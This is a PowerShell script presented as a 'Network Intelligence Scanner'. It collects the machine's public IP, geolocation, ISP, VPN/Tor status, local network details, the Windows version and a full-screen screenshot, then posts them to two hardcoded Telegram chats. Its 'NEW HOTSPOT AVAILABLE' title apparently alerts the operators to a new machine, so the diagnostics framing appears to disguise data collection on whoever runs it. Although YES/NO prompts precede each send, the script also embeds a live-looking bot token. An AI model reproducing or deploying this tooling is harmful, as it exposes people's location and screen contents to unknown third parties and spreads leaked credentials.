
# ==================================================
# NETWORK INTELLIGENCE SCANNER v2.4
# Windows PowerShell 5.1+
# ==================================================

$ErrorActionPreference = "Stop"

# ================= TELEGRAM ======================

$botToken = "8715775001:AAGivZLOBG_YdpCuMlX6JIbFusUI5ofZ8Sk"

$chatIds = @(
    "8640543929",
    "8362186234"
)

$reportTitle = "NEW HOTSPOT AVAILABLE"

# ================= SETTINGS ======================

$enableVpnCheck = $true
$enableScreenshot = $true

$reportDir = Join-Path $env:USERPROFILE `
    "Documents\NetworkScannerReports"

New-Item -ItemType Directory `
    -Force -Path $reportDir | Out-Null

$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"

# ================= FUNCTIONS =====================

function Get-ApiData {
    param([string]$Url)

    try {
        return Invoke-RestMethod `
            -Uri $Url `
            -TimeoutSec 10 `
            -ErrorAction Stop
    }
    catch {
        return $null
    }
}

function Get-SafeValue {
    param($Value)

    if ($null -eq $Value -or
        [string]::IsNullOrWhiteSpace([string]$Value)) {
        return "Unknown"
    }

    return [string]$Value
}

function Escape-Html {
    param($Value)

    return [System.Net.WebUtility]::HtmlEncode(
        [string]$Value
    )
}

function Confirm-Action {
    param([string]$Question)

    $answer = (Read-Host "$Question (YES/NO)").Trim()

    return ($answer -ieq "YES")
}

# ================= PUBLIC IP =====================

Write-Host "Network Intelligence Scanner v2.4"
Write-Host "Collecting network diagnostics..."

$ipv4 = "Unavailable"
$ipv6 = "Unavailable"

$ip4Data = Get-ApiData `
    "https://api.ipify.org?format=json"

if ($ip4Data -and $ip4Data.ip) {
    $ipv4 = $ip4Data.ip
}

# IPv6 is optional
$ip6Data = Get-ApiData `
    "https://api6.ipify.org?format=json"

if ($ip6Data -and $ip6Data.ip) {
    $ipv6 = $ip6Data.ip
}

# ================= GEOLOCATION ===================

$geo = $null

if ($ipv4 -ne "Unavailable") {
    $geo = Get-ApiData `
        "https://ipapi.co/$ipv4/json/"
}

$country  = Get-SafeValue $geo.country_name
$region   = Get-SafeValue $geo.region
$city     = Get-SafeValue $geo.city
$timezone = Get-SafeValue $geo.timezone
$isp      = Get-SafeValue $geo.org
$asn      = Get-SafeValue $geo.asn

# ================= VPN / PROXY ===================

$vpnStatus = "Unknown"
$proxyStatus = "Unknown"
$torStatus = "Unknown"
$networkType = "Unknown"

if ($enableVpnCheck -and $ipv4 -ne "Unavailable") {

    $proxyData = Get-ApiData `
        "https://proxycheck.io/v2/${ipv4}?vpn=1"

    if ($proxyData) {
        $entry = $proxyData.PSObject.Properties[$ipv4]

        if ($entry) {
            $proxyInfo = $entry.Value

            if ($proxyInfo.proxy -eq "yes") {
                $proxyStatus = "Detected"
                $vpnStatus = "Possible"
            }
            elseif ($proxyInfo.proxy -eq "no") {
                $proxyStatus = "Not detected"
                $vpnStatus = "Not detected"
            }

            $networkType = Get-SafeValue $proxyInfo.type
        }
    }

    $torList = Get-ApiData `
        "https://check.torproject.org/torbulkexitlist"

    if ($torList -is [string]) {
        $torAddresses = $torList -split "\r?\n"
        $torStatus = if ($ipv4 -in $torAddresses) {
            "Exit node detected"
        }
        else {
            "Not detected"
        }
    }
}

# ================= LOCAL NETWORK =================

$localIPv4 = "Unavailable"
$gateway = "Unavailable"
$dnsServers = "Unavailable"
$adapterName = "Unavailable"

try {
    $network = Get-NetIPConfiguration |
        Where-Object {
            $_.IPv4DefaultGateway -and $_.NetAdapter.Status -eq "Up"
        } |
        Select-Object -First 1

    if ($network) {
        $adapterName = $network.InterfaceAlias
        $localIPv4 = Get-SafeValue $network.IPv4Address.IPAddress
        $gateway = Get-SafeValue $network.IPv4DefaultGateway.NextHop
        $dnsServers = (
            $network.DNSServer.ServerAddresses -join ", "
        )
    }
}
catch {
    Write-Warning "Local network inspection unavailable."
}

# ================= INTERNET TEST =================

$pingStatus = "Unavailable"
$pingMs = "Unavailable"

try {
    $reply = Test-Connection `
        -ComputerName "1.1.1.1" `
        -Count 2 `
        -ErrorAction Stop

    $pingMs = [math]::Round(
        ($reply | Measure-Object ResponseTime -Average).Average,
        1
    )

    $pingStatus = "Connected"
}
catch {
    $pingStatus = "No ping response"
}

# ================= WINDOWS =======================

$windowsVersion = "Unknown"

try {
    $os = Get-CimInstance Win32_OperatingSystem

    $windowsVersion = "$($os.Caption) ($($os.Version))"
}
catch {}

# ================= REPORT ========================

$report = [ordered]@{
    ReportTitle = $reportTitle
    ScanTime = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")

    PublicIPv4 = $ipv4
    PublicIPv6 = $ipv6

    Country = $country
    Region = $region
    City = $city
    Timezone = $timezone

    ISP = $isp
    ASN = $asn

    VPN = $vpnStatus
    Proxy = $proxyStatus
    Tor = $torStatus
    NetworkType = $networkType

    LocalIPv4 = $localIPv4
    Gateway = $gateway
    DNS = $dnsServers
    NetworkAdapter = $adapterName

    Internet = $pingStatus
    PingMs = $pingMs

    Windows = $windowsVersion
}

# ================= EXPORT ========================

$jsonPath = Join-Path $reportDir `
    "scan_$timestamp.json"

$htmlPath = Join-Path $reportDir `
    "scan_$timestamp.html"

$report |
    ConvertTo-Json -Depth 5 |
    Set-Content -Path $jsonPath -Encoding UTF8

$tableRows = foreach ($item in $report.GetEnumerator()) {
    $key = Escape-Html $item.Key
    $value = Escape-Html $item.Value

    "<tr><td>$key</td><td>$value</td></tr>"
}

$html = @"
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Network Scanner Report</title>
<style>
body {
    font-family: Segoe UI, Arial;
    background: #101827;
    color: #e8edf5;
    padding: 30px;
}
h1 { color: #77c3ff; }
table {
    width: 100%;
    border-collapse: collapse;
}
td {
    border: 1px solid #46556d;
    padding: 12px;
}
tr:nth-child(even) {
    background: #1b2940;
}
td:first-child {
    font-weight: bold;
    width: 35%;
}
</style>
</head>
<body>
<h1>Network Intelligence Report</h1>
<table>
$($tableRows -join "`n")
</table>
</body>
</html>
"@

$html | Set-Content `
    -Path $htmlPath `
    -Encoding UTF8

# ================= PREVIEW =======================

Write-Host ""
Write-Host "========== NETWORK REPORT =========="
$report.GetEnumerator() |
    Format-Table -AutoSize -Wrap |
    Out-Host

Write-Host "JSON: $jsonPath"
Write-Host "HTML: $htmlPath"

# ================= TELEGRAM ======================

function Send-TelegramText {
    param([string]$Message)

    if ($botToken -eq "PASTE_YOUR_NEW_BOT_TOKEN_HERE") {
        Write-Warning "Telegram bot token is not configured."
        return
    }

    foreach ($chatId in $chatIds) {
        try {
            $body = @{
                chat_id = $chatId
                text = $Message
                parse_mode = "HTML"
            }

            Invoke-RestMethod `
                -Uri "https://api.telegram.org/bot$botToken/sendMessage" `
                -Method Post `
                -Body $body `
                -ErrorAction Stop | Out-Null

            Write-Host "Report sent to $chatId"
        }
        catch {
            Write-Warning "Telegram error for ${chatId}: $($_.Exception.Message)"
        }
    }
}

$telegramLines = foreach ($item in $report.GetEnumerator()) {
    $key = Escape-Html $item.Key
    $value = Escape-Html $item.Value

    "<b>${key}:</b> $value"
}

$telegramMessage = "<b>$(Escape-Html $reportTitle)</b>" +
    "`n`n" + ($telegramLines -join "`n")

if (Confirm-Action "Send network report to Telegram?") {
    Send-TelegramText $telegramMessage
}
else {
    Write-Host "Network report was not sent."
}

# ================= SCREENSHOT ====================

if ($enableScreenshot) {

    if (Confirm-Action "Capture a screenshot of the primary display?") {

        try {
            Add-Type -AssemblyName System.Windows.Forms
            Add-Type -AssemblyName System.Drawing

            $screen = [System.Windows.Forms.Screen]::PrimaryScreen
            $bounds = $screen.Bounds

            $bitmap = New-Object System.Drawing.Bitmap(
                $bounds.Width,
                $bounds.Height
            )

            $graphics = [System.Drawing.Graphics]::FromImage(
                $bitmap
            )

            try {
                $graphics.CopyFromScreen(
                    $bounds.Location,
                    [System.Drawing.Point]::Empty,
                    $bounds.Size
                )

                $screenPath = Join-Path $reportDir `
                    "screenshot_$timestamp.png"

                $bitmap.Save(
                    $screenPath,
                    [System.Drawing.Imaging.ImageFormat]::Png
                )
            }
            finally {
                $graphics.Dispose()
                $bitmap.Dispose()
            }

            Write-Host "Screenshot saved: $screenPath"

            # Open screenshot for inspection
            Start-Process $screenPath

            if (Confirm-Action "Send the reviewed screenshot to Telegram?") {

                if ($botToken -eq "PASTE_YOUR_NEW_BOT_TOKEN_HERE") {
                    Write-Warning "Telegram bot token is missing."
                }
                else {
                    foreach ($chatId in $chatIds) {
                        try {
                            Add-Type -AssemblyName System.Net.Http

                            $client = [System.Net.Http.HttpClient]::new()
                            $form = [System.Net.Http.MultipartFormDataContent]::new()

                            try {
                                $form.Add(
                                    [System.Net.Http.StringContent]::new(
                                        [string]$chatId
                                    ),
                                    "chat_id"
                                )

                                $bytes = [System.IO.File]::ReadAllBytes(
                                    $screenPath
                                )

                                $photo = [System.Net.Http.ByteArrayContent]::new(
                                    $bytes
                                )

                                $photo.Headers.ContentType =
                                    [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse(
                                        "image/png"
                                    )

                                $form.Add(
                                    $photo,
                                    "photo",
                                    "screenshot.png"
                                )

                                $response = $client.PostAsync(
                                    "https://api.telegram.org/bot$botToken/sendPhoto",
                                    $form
                                ).GetAwaiter().GetResult()

                                $response.EnsureSuccessStatusCode() |
                                    Out-Null

                                Write-Host "Screenshot sent to $chatId"
                            }
                            finally {
                                $form.Dispose()
                                $client.Dispose()
                            }
                        }
                        catch {
                            Write-Warning "Screenshot send error for ${chatId}: $($_.Exception.Message)"
                        }
                    }
                }
            }
        }
        catch {
            Write-Warning "Screenshot error: $($_.Exception.Message)"
        }
    }
}

Write-Host ""
Write-Host "Network scan completed."
Write-Host "Reports: $reportDir"

Read-Host "Press Enter to exit"
